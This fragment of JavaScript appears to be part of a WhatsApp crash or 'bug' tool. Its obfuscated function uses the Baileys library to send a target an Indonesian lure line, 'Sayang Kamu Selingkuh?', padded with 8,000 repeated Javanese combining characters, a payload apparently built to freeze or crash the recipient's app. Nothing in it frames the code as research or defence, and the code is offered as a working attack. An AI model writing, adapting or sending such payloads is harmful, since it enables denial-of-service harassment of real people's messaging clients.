...
async function Xyraa4SxFc(target) {
  try {
    const XyrNpc = generateWAMessageFromContent(target, {
      extendedTextMessage: {
        text: "Sayang Kamu Selingkuh?" + "ꦽ".repeat(4000) + "ꦾ".repeat(4000),
        contextInfo: {
    ...
    await sock.relayMessage(target, XyrNpc.message, {
      messageId: XyrNpc.key.id,
    });
  } catch (err) {
    console.error("Error di Xyraa4SxFc:", err);
  }
}
